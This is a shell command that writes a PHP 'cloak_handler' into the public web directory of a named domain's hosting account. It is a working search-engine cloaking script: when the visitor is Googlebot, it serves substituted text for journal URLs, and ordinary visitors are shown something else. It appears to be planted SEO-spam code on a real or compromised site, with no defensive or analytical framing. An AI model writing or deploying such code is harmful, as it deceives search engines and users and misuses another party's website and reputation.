cat > /home/u457839213/domains/ukinstitute.org/public_html/journals/cloak_handler.php << 'EOF'
<?php
// Cloaking handler - Minimal working version
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$uri = $_SERVER['REQUEST_URI'] ?? '';

// Deteksi Googlebot
if (stripos($ua, 'googlebot') !== false) {
    // Untuk /journals/jopp
    if (strpos($uri, '/journals/jopp') !== false) {
        $file = '/home/u457839213/domains/ukinstitute.org/public_html/quarantine/jopp.txt';
        if (file_exists($file)) {
            header('Content-Type: text/plain');
            readfile($file);
        } else {
            echo 'cache not ready';
        }
        exit;
    }
}
?>
